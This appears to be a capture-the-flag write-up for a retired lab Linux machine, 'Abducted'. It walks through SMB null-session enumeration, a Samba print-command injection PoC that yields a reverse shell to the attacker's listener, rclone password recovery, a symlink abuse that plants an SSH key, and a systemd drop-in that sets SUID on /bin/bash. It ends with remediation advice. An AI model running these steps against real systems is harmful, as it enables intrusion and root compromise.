| Property         | Value                                                                                                                                                       |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                                                       |
| **Difficulty**   | Medium                                                                                                                                                      |
| **Release Date** | 2026-06-05                                                                                                                                                  |
| **State**        | Retired                                                                                                                                                     |
| **IP**           | 10.129.244.177                                                                                                                                              |
| **Techniques**   | SMB null session enumeration, Samba `print command` OS command injection, rclone secret recovery, Samba `force user` symlink abuse, systemd drop-in privesc |
| **Tags**         | #web #privesc #smb #linux                                                                                                                                   |

---
## Summary

Abducted is a medium Linux machine built around Samba misconfiguration. A null SMB session discloses several shares and a valid username, `scott`. The `HP-Reception` print share is vulnerable to CVE-2026-4480, an unescaped shell-metacharacter injection in Samba's `print command` handling, which is exploited by submitting a crafted raw print job over the `spoolss` RPC interface to obtain a reverse shell as `nobody`. An `rclone` backup configuration found on disk discloses an obscured backup password, which decodes (via `rclone reveal`) to `scott`'s SSH password, granting SSH access. Reviewing the Samba configuration shows the `transfer` share forces every connecting user's filesystem operations to run as `marcus`, and enables insecure wide symlinks. A symlink pointing to `marcus`'s home directory is written inside `transfer`, and an SSH public key is written through it into `marcus`'s `authorized_keys`, granting a shell as `marcus`. `marcus` belongs to the `operators` group, which owns a writable systemd drop-in directory for the `smbd` service; dropping a malicious `ExecStart` override and restarting the service (with elevated group rights) sets the SUID bit on `/bin/bash`, granting a root shell.

---
## Enumeration

```
echo '10.129.244.177 abducted.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sC -sV abducted.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-10 09:09 EDT
Nmap scan report for abducted.htb (10.129.244.177)
Host is up (0.028s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-09-10T13:09:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
```

### SMB Enumeration

A SMB null session is permitted, and discloses the share layout:

```
nxc smb abducted.htb -u '' -p '' --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False) 
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\: 
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
```

Four shares stand out: `HP-Reception`, and two internal shares, `projects` and `transfer`, that are not yet accessible anonymously. `HP-Reception` draws attention since printer shares back onto Samba's printing subsystem.

### RPC User Enumeration

The null session also allows RPC calls via `rpcclient`:

```
rpcclient -U '' -N abducted.htb
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
```

The local user `scott` is disclosed:

```
rpcclient $> queryuser 0x3e8
        User Name   :   scott
        Full Name   :   Scott Mercer
        Home Drive  :   \\ABDUCTED\scott
        ...
        Password last set Time   :      Tue, 02 Jun 2026 11:16:45 EDT
        ...
```

---
## Foothold

### CVE-2026-4480 - Samba `print command` OS Command Injection

Samba's printing subsystem substitutes several tokens (`%s` for the spool file, `%J` for the job name, etc.) into the shell command defined in `smb.conf`'s `print command` directive before executing it. The client-supplied job description that fills `%J` is not sanitized for shell metacharacters before substitution. A remote unauthenticated client can submit a print job whose "document info" name contains shell metacharacters, and have them interpreted by the shell that runs the configured print command.

Reference: [nvd.nist.gov/vuln/detail/CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480)

**Attack flow:**

1. Connect to the `spoolss` (print spooler) RPC interface on the `HP-Reception` printer share.
2. Open the printer handle and start a new document, supplying a malicious job description as the document name (e.g. containing `| sh`).
3. Write arbitrary "page" data (the payload to be piped into the shell) and close out the job.
4. When Samba invokes the configured `print command` to process the finished job, the unescaped `%J` substitution injects the attacker's shell metacharacters, executing the payload.

### Exploitation

PoC: [github.com/0xBlackash/CVE-2026-4480](https://github.com/0xBlackash/CVE-2026-4480/blob/main/CVE-2026-4480.py)

```
python3 CVE-2026-4480.py -t 10.129.244.177 -l 10.10.15.179 -p 9001

[*] Target: 10.129.244.177
[*] Callback: 10.10.15.179:9001
[*] Verify mode: False

[+] Credentials initialized (anonymous)
[+] Connected to spoolss interface
[+] Opened printer: HP-Reception
[+] Created DocumentInfo with payload: |sh
[+] Generated payload (78 bytes)
[*] Starting document...
[*] Starting page...
[*] Writing payload (78 bytes)...
[*] Ending page...
[*] Ending document (TRIGGERING EXPLOIT)...
[+] Print job submitted successfully!
[+] Closed printer handle

[+] Exploit completed!
[*] Check your listener for reverse shell...
```

The script authenticates anonymously to the `spoolss` interface, opens the `HP-Reception` printer, and sets the job's `DocumentInfo` name to `|sh`, causing the substituted `%J` token to close out the intended command and pipe the job's raw page data straight into a shell.

```
nc -lvnp 9001               
listening on [any] 9001 ...
connect to [10.10.15.179] from (UNKNOWN) [10.129.244.177] 49954
bash: cannot set terminal process group (2147): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$
```

A shell is obtained as `nobody`, the guest account Samba maps unauthenticated sessions to (`map to guest = Bad User` in `smb.conf`).

---
## Lateral Movement from `nobody` to `scott`

### Enumeration

Enumerating the filesystem as `nobody` discloses an offsite backup configuration:

```
nobody@abducted:/opt/offsite-backup$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jun  4 13:41 .
drwxr-xr-x 3 root root 4096 Jun  4 13:41 ..
-rw-r--r-- 1 root root  141 Oct  9  2025 rclone.conf
-rwxr-xr-x 1 root root  105 Oct  9  2025 sync.sh
```

```
nobody@abducted:/opt/offsite-backup$ cat rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

```
nobody@abducted:/opt/offsite-backup$ cat sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

The `pass` value in an rclone config is not encrypted, it is obscured with rclone's own reversible XOR-based obfuscation. Any user with the `rclone` binary can reverse it directly.

```
nobody@abducted:/opt/offsite-backup$ rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw' 
iXzvcib3SrpZ
```

### Credential Reuse

The revealed backup password turns out to be reused as `scott`'s local Linux/SSH password:

```
ssh scott@abducted.htb
scott@abducted.htb's password: iXzvcib3SrpZ
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...
scott@abducted:~$
```

## User Flag

```
scott@abducted:~$ cat user.txt
d6db308333763a29f376608ee626a566
```

---

## Lateral Movement from `scott` to `marcus`

### Enumeration

Authenticated share enumeration as `scott` shows write access on `projects`:

```
nxc smb abducted.htb -u 'scott' -p 'iXzvcib3SrpZ' --shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects        READ,WRITE      Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer        READ            Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
```

```
scott@abducted:~$ ls /home
marcus  scott
```

Reading the Samba configuration exposes the key detail:

```
scott@abducted:~$ cat /etc/samba/smb.conf  
[global]  
workgroup = WORKGROUP  
server string = Hartley Group Document Services  
netbios name = ABDUCTED  
map to guest = Bad User  
guest account = nobody  
security = user  
printing = sysv  
load printers = no  
disable spoolss = no  
unix extensions = no  
allow insecure wide links = yes  
log level = 0  
include = /etc/samba/shares.conf
```

```
scott@abducted:~$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Two settings on `[transfer]` combine into a privilege escalation flaw:

- **`force user = marcus`** regardless of which user authenticates to this share, Samba performs every filesystem operation on it under the identity of `marcus`.
- **`wide links = yes`** (share-level) together with the **global** **`allow insecure wide links = yes`**  Samba will follow symbolic links even when they point outside the share's own root directory, a setting that is disabled by default specifically because it breaks share isolation.

Any file `scott` can  write inside `transfer` is actually written as `marcus`, and a symlink planted in `transfer` can redirect that write anywhere on the filesystem `marcus` can reach, like `marcus`  home directory.

### Exploitation

An SSH key pair is generated locally, to be planted as an authorized key for `marcus`:

```
scott@abducted:/srv/transfer$ ssh-keygen -q -t ed25519 -N '' -f /tmp/k
```

A symlink pointing from inside the `transfer` share out to `marcus`'s home directory is created:

```
scott@abducted:/srv/transfer$ ln -s /home/marcus /srv/transfer/mh
```

Connecting back to the share over SMB (as `scott`, but with Samba doing the actual I/O as `marcus` thanks to `force user`) and writing through the symlink:

```
scott@abducted:/srv/transfer$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
NT_STATUS_OBJECT_NAME_COLLISION making remote directory \mh\.ssh
putting file /tmp/k.pub as \mh\.ssh\authorized_keys (31.2 kb/s) (average 31.2 kb/s)
```

Since Samba resolves `mh` back to `/home/marcus` and performs the write as `marcus`, the generated public key lands in `/home/marcus/.ssh/authorized_keys`

```
scott@abducted:/srv/transfer$ ssh -i /tmp/k marcus@10.129.244.177
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...
marcus@abducted:~$
```

A shell is obtained as `marcus`.

---
## Privilege Escalation

### Enumeration

```
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

`marcus` belongs to a non-default group, `operators`. Searching for files owned by that group discloses a systemd drop-in directory for the Samba daemon itself:

```
marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
```

```
marcus@abducted:~$ ls -la /etc/systemd/system/smbd.service.d
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```

The directory is owned by `root:operators` with the setgid bit and full group read/write/execute (`drwxrws---`), meaning any member of `operators` can create files inside it. Any `.conf` file dropped here is treated by systemd as an override for the `smbd.service` unit and is merged into its configuration on the next daemon reload, letting a group member redefine how the service starts (the service runs as root).

### Exploitation

A drop-in overriding `ExecStart` is created, replacing the original start command with one that grants the SUID bit to `/bin/bash`:

```
marcus@abducted:/etc/systemd/system/smbd.service.d$ cat > pwn.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/bin/bash -c "chmod +s /bin/bash"
EOF
```

The empty `ExecStart=` line is required syntax to clear the unit's existing `ExecStart=` directive before supplying the replacement; without it, systemd would simply append a second start command rather than override the first.

```
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
Job for smbd.service failed because the service did not take the steps required by its unit configuration.
```

The service itself fails to come up cleanly afterward (the replaced `ExecStart` never actually starts the real `smbd` binary), but that is irrelevant as the single command in the override already ran as `root` before systemd gave up on the unit:

```
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

`/bin/bash` is now SUID root. Invoking it with `-p` preserves the elevated privileges instead of dropping them:

```
marcus@abducted:/etc/systemd/system/smbd.service.d$ /bin/bash -p
bash-5.2# id
uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)
```

## Root Flag

```
bash-5.2# cat /root/root.txt
2b571e74c95673726d522682fa4d0a03
```

---

## Remediation

- **Null/anonymous SMB sessions:** Disable guest access and anonymous RPC enumeration (`restrict anonymous`, `map to guest = never`) unless explicitly required; anonymous `enumdomusers`/share listing hands an attacker the initial recon for free.
- **CVE-2026-4480 (Samba `print command` injection):** Patch Samba to a version that properly escapes shell metacharacters in all `%`-substitution tokens before passing them to the shell, or avoid custom `print command` scripts entirely where not strictly necessary. Restrict who can submit print jobs (`guest ok = no`) on any share backed by a shell-invoking command.
- **Reversible secrets in configuration files:** Store backup credentials in a proper secrets manager or restrict read access to the configuration file to the owning service account only.
- **Password reuse across service and OS accounts:** Enforce unique credentials per service and per account.
- **`force user` + insecure wide links:** Never combine `force user` with `wide links`/`allow insecure wide links` on a share reachable by lower-privileged users. This combination allows any writer on the share to perform arbitrary filesystem writes as the forced user, entirely bypassing normal Unix permission checks. Disable `allow insecure wide links` globally (the modern Samba default) and avoid `force user` on shares where multiple distinct identities can write.
- **Overly permissive group ownership of systemd unit drop-in directories:** A directory that controls how a root-run systemd service starts must never be group-writable by a non-administrative group. Restrict `/etc/systemd/system/*.service.d/` to `root:root` with no group write access, and audit group memberships (`operators`, in this case) for unintended file-system control paths.

---
## References

- [CVE-2026-4480 — Samba Print Command OS Command Injection (NVD)](https://nvd.nist.gov/vuln/detail/cve-2026-4480)
- [CVE-2026-4480 PoC — 0xBlackash](https://github.com/0xBlackash/CVE-2026-4480/blob/main/CVE-2026-4480.py)
- [Samba Documentation — `smb.conf`: `wide links` / `allow insecure wide links`](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
- [Samba Documentation — `smb.conf`: `force user`](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
- [rclone Documentation — Configuration Encryption / Obscuring Passwords](https://rclone.org/docs/#configuration-encryption)
- [systemd.unit(5) — Drop-In Configuration Files](https://www.freedesktop.org/software/systemd/man/systemd.unit.html)